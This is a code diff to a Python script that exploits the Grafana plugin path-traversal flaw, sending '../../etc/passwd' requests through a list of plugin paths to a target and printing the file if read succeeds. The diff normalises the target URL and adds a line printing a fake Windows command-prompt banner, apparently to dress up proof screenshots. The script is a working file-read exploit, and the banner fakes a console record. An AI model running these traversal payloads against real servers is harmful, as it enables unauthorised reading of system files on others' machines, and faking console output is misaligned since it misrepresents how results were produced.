@@ -12,7 +12,7 @@ import re
 
 urllib3.disable_warnings()
 
-def verify(site):
+def verify(target):
     plugin_list = [
         '/public/plugins/alertlist/../../../../../../../../etc/passwd',
         '/public/plugins/annolist/../../../../../../../../etc/passwd',
@@ -56,6 +56,7 @@ def verify(site):
         '/public/plugins/zipkin/../../../../../../../../etc/passwd',
     ]
     headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
+    site = "/".join(target.split("/")[:3])
     for plugin_path in plugin_list:
         paylaod = site + plugin_path
         try:
@@ -75,6 +76,7 @@ def verify(site):
 
 if __name__=="__main__":
     target = sys.argv[1]
+    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 grafana-file-read.py ",target)
     info = verify(target)
     if info:
         print("[+]漏洞存在，读取 passwd 的结果为：", info)
